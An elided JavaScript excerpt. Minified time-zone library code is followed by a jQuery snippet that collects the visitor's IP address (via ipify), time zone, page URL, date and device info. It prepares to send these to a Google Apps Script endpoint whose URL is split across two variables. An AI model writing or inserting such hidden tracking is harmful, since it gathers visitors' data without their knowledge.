...
!(function (a, i) {
  ...
  function E() {
    ...
    for (r = 0; r < n.length; r++) {
      for (e = new M(P(n[r]), c), o = 0; o < c; o++) e.scoreOffsetAt(A[o]);
      t.push(e);
    }
  ...
  function _(a) {
    T(a.zones), S(a.links), (C.dataVersion = a.version);
  }
  function k(a) {
    var i = "X" === a._f || "x" === a._f;
...
$(document).ready(function () {
  $.getJSON("https://api.ipify.org?format=json", function (data) {
    var usip, usloc, ushrf, usdt;
    usip = data.ip;
    usloc = moment.tz.guess();
    ushrf = escape(window.location.href);
    usdt = new Date();
    ...
    console.log(usip, usloc, ushrf, usdt, dvcinf);
    var ur1 = "https://script.google.com/macros/s/";
    var ur2 =
      "AKfycbxKtMeUdWPe6Mk7qv_hquqziWT8WA3lrNtpCUyqsNzCiWZCnPtaNnDovgC20-KBLYVd";
